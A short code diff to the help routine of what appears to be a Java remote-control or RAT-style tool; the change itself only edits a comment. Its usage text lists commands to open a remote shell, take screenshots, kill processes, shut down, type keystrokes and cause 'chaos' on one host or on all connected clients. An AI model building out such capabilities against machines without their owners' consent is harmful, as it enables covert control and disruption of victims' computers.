@@ -14,7 +14,7 @@ public abstract class Help
      */
     public static void printHelp(String command)
     {
-        if(command == null) // user wants full help
+        if(command == null) // user wants full, brief help
             System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_REMOTE_SHELL + " HOST\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_MINIMISE + " HOST\n\t" + CMD_LIST_PROCESSES + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_WALLPAPER + " HOST /path/to/local/image/file\n\t" + CMD_ROTATE + " HOST ORIENTATION\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_KILL_PROCESS + " HOST TYPE ARG\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
         else
         {
